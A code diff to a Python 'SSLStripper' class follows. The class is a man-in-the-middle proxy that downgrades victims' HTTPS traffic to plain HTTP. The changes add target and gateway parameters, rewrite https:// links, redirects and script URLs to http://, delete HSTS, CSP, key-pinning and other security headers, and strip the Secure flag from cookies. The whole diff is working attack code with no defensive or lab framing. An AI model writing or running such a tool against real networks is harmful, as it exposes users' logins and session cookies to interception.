@@ -3,18 +3,15 @@ import threading
 from http.server import BaseHTTPRequestHandler
 from io import BytesIO
 import re
-
-class HTTPRequest(BaseHTTPRequestHandler):
-    def __init__(self, request_text):
-        self.rfile = BytesIO(request_text)
-        self.raw_requestline = self.rfile.readline()
-        self.error_code = self.error_message = None
-        self.parse_request()
+import ssl
+from urllib.parse import urlparse, urljoin
 
 class SSLStripper:
-    def __init__(self, interface, port=8080):
+    def __init__(self, interface, target, gateway, port=8080):
         self.interface = interface
-        self.host = '0.0.0.0'  # Listen on all interfaces
+        self.target = target
+        self.gateway = gateway
+        self.host = '0.0.0.0'
         self.port = port
         self.running = False
         self.server_socket = None
@@ -27,41 +24,72 @@ class SSLStripper:
                 client_socket.close()
                 return
 
-            http_request = HTTPRequest(request)
+            # Parse the request
+            request_str = request.decode('utf-8', errors='ignore')
+            first_line = request_str.split('\n')[0]
+            method, path, _ = first_line.split(' ')
 
-            host_header = http_request.headers.get('Host')
-            if not host_header:
-                print(f"[!] No Host header from {client_address}")
+            # Extract host from headers
+            host_match = re.search(r'Host: (.*?)\r\n', request_str)
+            if not host_match:
                 client_socket.close()
                 return
+            
+            host = host_match.group(1).strip()
+            
+            # Handle HTTPS URLs and redirects
+            if path.startswith('https://'):
+                path = path.replace('https://', 'http://', 1)
+                print(f"[+] Stripped HTTPS from request path: {path}")
 
             # Create connection to remote server
             remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            remote_socket.connect((host_header, 80))
-            
-            # Modify request: remove secure flags
-            modified_request = self.strip_request_security(request)
-            remote_socket.sendall(modified_request)
+            try:
+                remote_socket.connect((host, 80))
+            except:
+                print(f"[!] Failed to connect to {host}")
+                client_socket.close()
+                return
 
-            # Get response from remote server
+            # Modify request headers
+            modified_request = self.strip_request_security(request_str, host, path)
+            remote_socket.sendall(modified_request.encode())
+
+            # Get and modify response
             response = self.receive_response(remote_socket)
-            remote_socket.close()
-
-            # Modify response content
-            modified_response = self.strip_response_security(response, host_header)
+            modified_response = self.strip_response_security(response, host)
+            
             client_socket.sendall(modified_response)
 
         except Exception as e:
             print(f"[!] Error handling client {client_address}: {e}")
         finally:
+            if 'remote_socket' in locals():
+                remote_socket.close()
             client_socket.close()
 
-    def strip_request_security(self, request):
-        """Remove security-related headers from the request"""
-        request_str = request.decode('utf-8', errors='ignore')
-        # Remove upgrade-insecure-requests header
-        request_str = re.sub(r'Upgrade-Insecure-Requests: 1\r\n', '', request_str)
-        return request_str.encode()
+    def strip_request_security(self, request_str, host, path):
+        """Strip security-related headers from request"""
+        # Remove security-related headers
+        headers_to_remove = [
+            'Upgrade-Insecure-Requests',
+            'Strict-Transport-Security',
+            'Content-Security-Policy',
+            'X-Content-Type-Options',
+            'X-Frame-Options',
+            'X-XSS-Protection'
+        ]
+        
+        for header in headers_to_remove:
+            request_str = re.sub(f'{header}:.*?\r\n', '', request_str, flags=re.IGNORECASE)
+
+        # Replace any remaining HTTPS URLs with HTTP
+        request_str = request_str.replace('https://', 'http://')
+        
+        # Ensure host header is correct
+        request_str = re.sub(r'Host:.*?\r\n', f'Host: {host}\r\n', request_str, flags=re.IGNORECASE)
+        
+        return request_str
 
     def strip_response_security(self, response, host):
         """Strip HTTPS and security features from response"""
@@ -69,23 +97,51 @@ class SSLStripper:
             response_str = response.decode('utf-8', errors='ignore')
             modified = False
 
-            # Strip HTTPS redirects
-            if "Location: https://" in response_str:
-                print(f"[*] Stripping HTTPS redirect for {host}")
-                response_str = response_str.replace("Location: https://", "Location: http://")
+            # Handle different types of redirects
+            redirect_codes = ['301', '302', '303', '307', '308']
+            first_line = response_str.split('\n')[0]
+            
+            if any(code in first_line for code in redirect_codes):
+                # Find and modify Location header
+                location_match = re.search(r'Location: (.*?)\r\n', response_str, re.IGNORECASE)
+                if location_match:
+                    original_location = location_match.group(1)
+                    new_location = original_location.replace('https://', 'http://')
+                    response_str = response_str.replace(original_location, new_location)
+                    print(f"[+] Modified redirect from {original_location} to {new_location}")
+                    modified = True
+
+            # Remove security headers
+            security_headers = [
+                'Strict-Transport-Security',
+                'Content-Security-Policy',
+                'X-Content-Type-Options',
+                'X-Frame-Options',
+                'X-XSS-Protection',
+                'Public-Key-Pins',
+                'Expect-CT'
+            ]
+            
+            for header in security_headers:
+                response_str = re.sub(f'{header}:.*?\r\n', '', response_str, flags=re.IGNORECASE)
+
+            # Replace HTTPS with HTTP in content
+            if 'text/html' in response_str or 'application/javascript' in response_str or 'text/css' in response_str:
+                # Replace in href and src attributes
+                response_str = re.sub(r'(href=["\'])(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
+                response_str = re.sub(r'(src=["\'])(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
+                response_str = re.sub(r'(url\(["\']?)(https://)', r'\1http://', response_str, flags=re.IGNORECASE)
+                
+                # Replace in JavaScript
+                response_str = re.sub(r'(["\'](https://[^\'"]+)["\'])', 
+                                    lambda m: m.group().replace('https://', 'http://', 1),
+                                    response_str)
+
                 modified = True
 
-            # Strip HTTPS from HTML content
-            if "text/html" in response_str:
-                # Replace HTTPS in links
-                response_str = re.sub(r'https://', 'http://', response_str)
-                # Remove security headers
-                response_str = re.sub(r'Strict-Transport-Security:.*\r\n', '', response_str)
-                response_str = re.sub(r'Content-Security-Policy:.*\r\n', '', response_str)
-                # Remove secure cookies
-                response_str = response_str.replace('secure;', '').replace('Secure;', '')
-                modified = True
-
+            # Remove secure flags from cookies
+            response_str = re.sub(r';\s*secure', '', response_str, flags=re.IGNORECASE)
+            
             if modified:
                 print(f"[+] Modified response for {host}")
             
@@ -97,14 +153,16 @@ class SSLStripper:
     def receive_response(self, sock):
         """Receive full response from socket"""
         response = b""
-        while True:
-            try:
+        sock.settimeout(2)
+        try:
+            while True:
                 data = sock.recv(4096)
                 if not data:
                     break
                 response += data
-            except socket.timeout:
-                break
+        except socket.timeout:
+            pass
+        sock.settimeout(None)
         return response
 
     def start(self):
@@ -140,7 +198,6 @@ class SSLStripper:
         if self.server_socket:
             self.server_socket.close()
         
-        # Clean up client threads
         for thread in self.threads:
             if thread.is_alive():
                 thread.join(timeout=1.0)
